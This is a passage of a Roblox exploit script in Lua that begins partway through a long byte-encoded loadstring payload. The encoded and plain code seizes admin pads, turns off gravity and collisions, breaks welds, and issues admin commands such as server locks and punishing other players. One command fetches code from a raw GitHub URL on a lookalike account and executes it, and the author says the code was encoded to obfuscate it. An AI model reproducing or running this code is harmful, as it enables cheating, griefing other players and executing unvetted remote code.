101\34\41\46\84\101\114\114\97\105\110\91\34\95\71\97\109\101\34\93\46\65\100\109\105\110\46\80\97\100\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\78\97\109\101\32\46\46\32\34\39\115\32\97\100\109\105\110\34\41\32\116\104\101\110\10\9\9\9\9\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\84\101\114\114\97\105\110\91\34\95\71\97\109\101\34\93\46\65\100\109\105\110\46\80\97\100\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\84\111\117\99\104\32\116\111\32\103\101\116\32\97\100\109\105\110\34\41\32\116\104\101\110\10\9\9\9\9\9\108\111\99\97\108\32\112\97\100\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\84\101\114\114\97\105\110\91\34\95\71\97\109\101\34\93\46\65\100\109\105\110\46\80\97\100\115\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\84\111\117\99\104\32\116\111\32\103\101\116\32\97\100\109\105\110\34\41\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\10\9\9\9\9\9\108\111\99\97\108\32\104\101\97\100\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\76\101\102\116\32\76\101\103\34\41\10\9\9\9\9\9\102\105\114\101\116\111\117\99\104\105\110\116\101\114\101\115\116\40\112\97\100\44\32\104\101\97\100\44\32\49\41\10\9\9\9\9\9\102\105\114\101\116\111\117\99\104\105\110\116\101\114\101\115\116\40\112\97\100\44\32\104\101\97\100\44\32\48\41\10\9\9\9\9\101\108\115\101\10\9\9\9\9\9\114\101\103\101\110\40\41\10\9\9\9\9\101\110\100\10\9\9\9\101\110\100\10\9\9\9\116\97\115\107\46\119\97\105\116\40\41\10\9\9\9\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\32\116\104\101\110\10\9\9\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\58\69\113\117\105\112\84\111\111\108\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\46\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\41\10\9\9\9\101\110\100\10\9\9\9\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\32\116\104\101\110\10\10\9\9\9\101\108\115\101\10\9\9\9\9\99\104\116\40\34\103\101\97\114\32\109\101\32\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\49\48\56\49\53\56\51\55\57\34\41\10\9\9\9\9\116\97\115\107\46\119\97\105\116\40\46\50\41\10\9\9\9\101\110\100\10\9\9\9\116\97\115\107\46\119\97\105\116\40\41\10\9\9\117\110\116\105\108\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\10\9\9\116\97\115\107\46\119\97\105\116\40\46\48\55\53\41\10\9\101\110\100\10\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\46\70\97\108\108\101\110\80\97\114\116\115\68\101\115\116\114\111\121\72\101\105\103\104\116\32\61\32\34\110\97\110\34\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\99\108\105\99\107\105\118\40\41\10\9\9\108\111\99\97\108\32\105\118\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\73\118\111\114\121\80\101\114\105\97\115\116\114\111\110\34\41\10\9\9\114\101\112\101\97\116\10\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\9\117\110\116\105\108\32\105\118\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\82\101\109\111\116\101\34\41\10\9\9\108\111\99\97\108\32\82\101\109\111\116\101\32\61\32\105\118\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\82\101\109\111\116\101\34\41\10\9\9\82\101\109\111\116\101\58\70\105\114\101\83\101\114\118\101\114\40\69\110\117\109\46\75\101\121\67\111\100\101\46\69\41\10\9\101\110\100\10\10\9\108\111\99\97\108\32\112\97\114\116\32\61\32\112\97\114\116\116\10\9\108\111\99\97\108\32\112\111\115\105\116\105\111\110\32\61\32\99\102\114\97\109\10\9\108\111\99\97\108\32\115\112\111\115\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\32\126\61\32\112\97\114\116\32\97\110\100\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\118\46\67\97\110\67\111\108\108\105\100\101\32\61\32\102\97\108\115\101\10\9\9\101\110\100\10\9\101\110\100\10\9\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\71\114\97\118\105\116\121\32\61\32\48\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\116\114\117\101\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\102\97\108\115\101\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\105\116\105\111\110\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\105\116\105\111\110\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\119\97\105\116\102\111\114\105\118\111\114\121\40\41\59\116\97\115\107\46\119\97\105\116\40\41\10\9\108\111\99\97\108\32\116\101\109\112\116\105\110\103\32\61\32\116\114\117\101\10\9\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\10\9\9\119\104\105\108\101\32\116\101\109\112\116\105\110\103\32\61\61\32\116\114\117\101\32\100\111\10\9\9\9\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\71\114\97\118\105\116\121\32\61\32\48\10\9\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\105\116\105\111\110\10\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\9\101\110\100\10\9\101\110\100\41\10\9\116\97\115\107\46\119\97\105\116\40\46\48\56\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\116\114\117\101\10\9\116\97\115\107\46\119\97\105\116\40\46\48\56\41\10\9\116\101\109\112\116\105\110\103\32\61\32\102\97\108\115\101\10\9\99\108\105\99\107\105\118\40\41\10\9\114\101\112\101\97\116\10\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\117\110\116\105\108\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\97\109\101\114\97\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\70\97\107\101\67\104\97\114\97\99\116\101\114\34\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\102\97\108\115\101\10\9\108\111\99\97\108\32\109\101\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\109\111\118\101\112\97\114\116\40\41\10\9\9\105\102\32\109\101\46\67\104\97\114\97\99\116\101\114\32\116\104\101\110\10\9\9\9\105\102\32\109\101\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\9\108\111\99\97\108\32\99\102\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\10\9\9\9\9\108\111\99\97\108\32\108\111\111\112\105\110\103\32\61\32\116\114\117\101\10\9\9\9\9\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\10\9\9\9\9\9\119\104\105\108\101\32\116\114\117\101\32\100\111\10\9\9\9\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\82\117\110\83\101\114\118\105\99\101\39\41\46\72\101\97\114\116\98\101\97\116\58\87\97\105\116\40\41\10\9\9\9\9\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\91\39\72\117\109\97\110\111\105\100\39\93\58\67\104\97\110\103\101\83\116\97\116\101\40\49\49\41\10\9\9\9\9\9\9\99\102\46\67\70\114\97\109\101\32\61\32\112\97\114\116\46\67\70\114\97\109\101\32\42\32\67\70\114\97\109\101\46\110\101\119\40\45\49\42\40\112\97\114\116\46\83\105\122\101\46\88\47\50\41\45\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\91\39\84\111\114\115\111\39\93\46\83\105\122\101\46\88\47\50\41\44\32\48\44\32\48\41\10\9\9\9\9\9\9\105\102\32\110\111\116\32\108\111\111\112\105\110\103\32\116\104\101\110\32\98\114\101\97\107\32\101\110\100\10\9\9\9\9\9\101\110\100\10\9\9\9\9\101\110\100\41\10\9\9\9\9\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\32\119\104\105\108\101\32\108\111\111\112\105\110\103\32\100\111\32\116\97\115\107\46\119\97\105\116\40\41\32\99\104\116\40\34\117\110\112\117\110\105\115\104\32\109\101\32\109\101\32\109\101\32\109\101\32\34\46\46\114\97\110\100\111\109\115\105\109\40\41\41\32\101\110\100\32\101\110\100\41\10\9\9\9\9\116\97\115\107\46\119\97\105\116\40\48\46\49\41\10\9\9\9\9\108\111\111\112\105\110\103\32\61\32\102\97\108\115\101\10\9\9\9\101\110\100\10\9\9\101\110\100\10\9\101\110\100\10\9\114\101\112\101\97\116\10\9\9\109\111\118\101\112\97\114\116\40\41\10\9\117\110\116\105\108\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\84\111\114\115\111\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\87\101\108\100\34\41\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\84\111\114\115\111\58\71\101\116\67\104\105\108\100\114\101\110\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\87\101\108\100\34\41\32\97\110\100\32\118\46\80\97\114\116\49\32\126\61\32\112\97\114\116\32\116\104\101\110\10\9\9\9\118\58\68\101\115\116\114\111\121\40\41\10\9\9\101\110\100\10\9\101\110\100\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\99\108\105\99\107\105\118\40\41\10\9\114\101\112\101\97\116\10\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\117\110\116\105\108\32\103\97\109\101\46\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\80\117\108\115\101\34\41\10\9\99\104\116\40\34\117\110\99\104\97\114\32\109\101\32\34\46\46\114\97\110\100\111\109\115\105\109\40\41\41\10\9\103\97\109\101\46\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\80\117\108\115\101\34\41\58\68\101\115\116\114\111\121\40\41\10\9\97\116\116\97\99\104\101\100\32\61\32\116\114\117\101\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\118\46\67\97\110\67\111\108\108\105\100\101\32\61\32\116\114\117\101\10\9\9\101\110\100\10\9\101\110\100\10\9\114\101\112\101\97\116\10\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\117\110\116\105\108\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\109\101\46\78\97\109\101\41\41\10\9\116\97\115\107\46\119\97\105\116\40\46\48\56\41\10\9\112\97\114\116\32\61\32\110\105\108\10\9\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\71\114\97\118\105\116\121\32\61\32\49\57\54\46\50\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\115\112\111\115\10\101\110\100\10\108\111\99\97\108\32\102\105\108\101\115\116\117\102\102\32\61\32\115\116\114\105\110\103\46\115\112\108\105\116\40\114\101\97\100\102\105\108\101\40\34\115\97\118\101\100\116\104\105\110\103\115\46\108\117\97\34\41\44\32\34\92\110\34\41\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\102\105\108\101\115\116\117\102\102\41\32\100\111\10\9\105\102\32\118\32\61\61\32\34\34\32\116\104\101\110\32\99\111\110\116\105\110\117\101\32\101\110\100\10\9\108\111\99\97\108\32\115\101\112\32\61\32\115\116\114\105\110\103\46\115\112\108\105\116\40\118\44\32\34\47\34\41\10\9\108\111\99\97\108\32\99\102\32\61\32\115\101\112\91\50\93\10\9\108\111\99\97\108\32\112\116\32\61\32\115\101\112\91\49\93\10\9\108\111\99\97\108\32\112\97\114\116\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\105\110\112\117\116\41\10\9\9\114\101\116\117\114\110\32\67\70\114\97\109\101\46\110\101\119\40\117\110\112\97\99\107\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\72\116\116\112\83\101\114\118\105\99\101\39\41\58\74\83\79\78\68\101\99\111\100\101\40\39\91\39\46\46\105\110\112\117\116\46\46\39\93\39\41\41\41\10\9\101\110\100\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\97\110\100\32\118\46\78\97\109\101\32\61\61\32\112\116\32\116\104\101\110\10\9\9\9\112\97\114\116\32\61\32\118\10\9\9\101\110\100\10\9\101\110\100\10\9\108\111\99\97\108\32\99\102\114\97\109\32\61\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\99\102\41\10\9\108\111\99\97\108\32\99\101\110\116\101\114\32\61\32\112\97\114\116\46\80\111\115\105\116\105\111\110\10\9\108\111\99\97\108\32\114\97\100\105\117\115\32\61\32\49\32\43\32\112\97\114\116\46\83\105\122\101\46\88\10\9\105\102\32\40\99\101\110\116\101\114\45\99\102\114\97\109\46\80\111\115\105\116\105\111\110\41\46\109\97\103\110\105\116\117\100\101\32\60\61\32\114\97\100\105\117\115\32\116\104\101\110\10\9\101\108\115\101\10\9\9\116\97\107\101\112\97\114\116\116\111\40\112\97\114\116\44\32\99\102\114\97\109\41\10\9\101\110\100\10\101\110\100\10")()
			end
			if msg:lower() == prefix .. "emergencymode1" then
				logn("ENABLE ALL PROTECTIVE ANTIS OR THIS WON'T WORK PROPERLY")
				chatt(prefix.."ap")
				emrgrab = true 
				task.wait(.15)
				chatt("//serverlock")
				chatt("//antistuff") -- yuck horrible code
				chatt("clr")
				chatt("fix");wait(1.5)
				chatt(prefix.."spam punish others " .. math.random(1, 1000));wait()
				chatt(prefix.."emrgrab")
				emrgrab = true
				task.wait(9.65)
				padAbuse = false
				testgrab = true
				logn("REJOIN IF IT FAILED")
				chatt(prefix.."stop")
				loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4Iw4reT3sts/scr4bl33/main/Part%20of%20the%20temp%20folder'), true))();wait(1.65)
				chatt(prefix.."/repott");wait(4)
				testgrab = false
			end
			if msg:lower() == prefix .. "previewbuild" then
				loadstring("\108\111\99\97\108\32\102\105\108\101\115\116\117\102\102\32\61\32\115\116\114\105\110\103\46\115\112\108\105\116\40\114\101\97\100\102\105\108\101\40\34\115\97\118\101\100\116\104\105\110\103\115\46\108\117\97\34\41\44\32\34\92\110\34\41\10\108\111\99\97\108\32\110\101\119\112\97\114\116\115\32\61\32\123\125\10\108\111\99\97\108\32\110\101\119\98\111\120\110\101\119\112\97\114\116\115\32\61\32\123\125\10\108\111\99\97\108\32\116\119\101\101\110\115\101\114\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\84\119\101\101\110\83\101\114\118\105\99\101\34\41\10\108\111\99\97\108\32\110\117\109\10\108\111\99\97\108\32\116\111\111\108\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\111\111\108\34\44\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\41\10\116\111\111\108\46\78\97\109\101\32\61\32\34\80\114\101\118\105\101\119\32\66\117\105\108\100\34\10\116\111\111\108\46\82\101\113\117\105\114\101\115\72\97\110\100\108\101\32\61\32\102\97\108\115\101\10\116\111\111\108\46\67\97\110\66\101\68\114\111\112\112\101\100\32\61\32\102\97\108\115\101\10\116\111\111\108\46\69\110\97\98\108\101\100\32\61\32\116\114\117\101\10\116\111\111\108\46\69\113\117\105\112\112\101\100\58\67\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\102\105\108\101\115\116\117\102\102\41\32\100\111\10\9\9\108\111\99\97\108\32\115\112\108\105\116\115\116\114\32\61\32\118\58\115\112\108\105\116\40\39\47\39\41\10\9\9\105\102\32\118\32\61\61\32\34\34\32\116\104\101\110\10\9\9\9\99\111\110\116\105\110\117\101\10\9\9\101\110\100\10\9\9\102\111\114\32\95\44\32\97\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\9\105\102\32\97\46\78\97\109\101\32\61\61\32\115\112\108\105\116\115\116\114\91\49\93\32\97\110\100\32\97\58\73\115\65\40\34\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\9\99\111\114\111\117\116\105\110\101\46\119\114\97\112\40\102\117\110\99\116\105\111\110\40\41\10\9\9\9\9\9\108\111\99\97\108\32\112\97\114\116\32\61\32\97\10\9\9\9\9\9\108\111\99\97\108\32\99\102\32\61\32\115\112\108\105\116\115\116\114\91\50\93\10\9\9\9\9\9\108\111\99\97\108\32\112\116\32\61\32\115\112\108\105\116\115\116\114\91\49\93\10\9\9\9\9\9\108\111\99\97\108\32\112\97\114\116\10\9\9\9\9\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\105\110\112\117\116\41\10\9\9\9\9\9\9\114\101\116\117\114\110\32\67\70\114\97\109\101\46\110\101\119\40\117\110\112\97\99\107\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\72\116\116\112\83\101\114\118\105\99\101\39\41\58\74\83\79\78\68\101\99\111\100\101\40\39\91\39\46\46\105\110\112\117\116\46\46\39\93\39\41\41\41\10\9\9\9\9\9\101\110\100\10\10\9\9\9\9\9\108\111\99\97\108\32\99\102\114\97\109\32\61\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\99\102\41\10\9\9\9\9\9\108\111\99\97\108\32\110\101\119\112\97\114\116\32\61\32\97\58\67\108\111\110\101\40\41\10\9\9\9\9\9\110\101\119\112\97\114\116\46\80\97\114\101\110\116\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\10\9\9\9\9\9\110\101\119\112\97\114\116\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\45\45\48\46\53\10\9\9\9\9\9\110\101\119\112\97\114\116\46\67\70\114\97\109\101\32\61\32\99\102\114\97\109\32\42\32\67\70\114\97\109\101\46\110\101\119\40\49\42\40\97\46\83\105\122\101\46\88\47\50\41\43\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\91\39\84\111\114\115\111\39\93\46\83\105\122\101\46\88\47\50\41\44\32\48\44\32\48\41\10\9\9\9\9\9\110\101\119\112\97\114\116\46\67\97\110\67\111\108\108\105\100\101\32\61\32\102\97\108\115\101\10\9\9\9\9\9\110\101\119\112\97\114\116\46\78\97\109\101\32\61\32\34\70\97\107\101\32\80\97\114\116\32\34\46\46\105\10\9\9\9\9\9\116\97\98\108\101\46\105\110\115\101\114\116\40\110\101\119\112\97\114\116\115\44\32\110\101\119\112\97\114\116\41\10\9\9\9\9\9\108\111\99\97\108\32\110\101\119\112\97\114\116\98\111\120\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\83\101\108\101\99\116\105\111\110\66\111\120\34\41\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\117\114\114\101\110\116\67\97\109\101\114\97\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\65\100\111\114\110\101\101\32\61\32\110\101\119\112\97\114\116\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\67\111\108\111\114\51\32\61\32\110\101\119\112\97\114\116\46\67\111\108\111\114\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\83\117\114\102\97\99\101\67\111\108\111\114\51\32\61\32\110\101\119\112\97\114\116\46\67\111\108\111\114\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\45\45\48\46\53\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\83\117\114\102\97\99\101\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\45\45\48\46\55\10\9\9\9\9\9\116\97\98\108\101\46\105\110\115\101\114\116\40\110\101\119\98\111\120\110\101\119\112\97\114\116\115\44\32\110\101\119\112\97\114\116\98\111\120\41\10\9\9\9\9\9\108\111\99\97\108\32\116\119\101\101\110\105\110\102\32\61\32\84\119\101\101\110\73\110\102\111\46\110\101\119\40\48\46\54\44\69\110\117\109\46\69\97\115\105\110\103\83\116\121\108\101\46\81\117\97\100\44\69\110\117\109\46\69\97\115\105\110\103\68\105\114\101\99\116\105\111\110\46\79\117\116\44\48\44\102\97\108\115\101\44\48\41\10\9\9\9\9\9\108\111\99\97\108\32\116\119\101\101\110\49\32\61\32\116\119\101\101\110\115\101\114\58\67\114\101\97\116\101\40\110\101\119\112\97\114\116\44\116\119\101\101\110\105\110\102\44\123\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\53\125\41\10\9\9\9\9\9\108\111\99\97\108\32\116\119\101\101\110\50\32\61\32\116\119\101\101\110\115\101\114\58\67\114\101\97\116\101\40\110\101\119\112\97\114\116\98\111\120\44\116\119\101\101\110\105\110\102\44\123\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\53\44\32\83\117\114\102\97\99\101\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\55\125\41\10\9\9\9\9\9\116\119\101\101\110\49\58\80\108\97\121\40\41\10\9\9\9\9\9\116\119\101\101\110\50\58\80\108\97\121\40\41\10\9\9\9\9\101\110\100\41\40\41\10\9\9\9\101\110\100\10\9\9\101\110\100\10\9\101\110\100\10\101\110\100\41\10\116\111\111\108\46\85\110\101\113\117\105\112\112\101\100\58\67\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\110\101\119\112\97\114\116\115\41\32\100\111\32\118\58\68\101\115\116\114\111\121\40\41\32\101\110\100\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\110\101\119\98\111\120\110\101\119\112\97\114\116\115\41\32\100\111\32\118\58\68\101\115\116\114\111\121\40\41\32\101\110\100\10\101\110\100\41\10")()
				-- I have to make bytecode out of this because it won't obfuscate for some reason. I've already tried many other things :/
			end
			if msg:lower() == prefix .. "lockapi" then
				setclipboard("https://raw.githubusercontent.com/M4lw4reT3sts/my-own-scripts-projects/main/Lock%20API%20Main.lua")
				logn("Check your clipboard.")
			end
			if msg:lower() == prefix .. "slockmuter" then
				chatt(prefix.."spam h fardaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ALSO I THINK TECHNO IS GOOD AT SCRIPTING BUT AT THE SAME TIME HE REALLY SUCKS! WHY DOES HE SUCK YOU MAY ASK. WELL HE PREFERED HEARTBEAT OVER TASK WAIT LIKE OMG HOWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW " .. math.random(1, 1000));wait(.65)
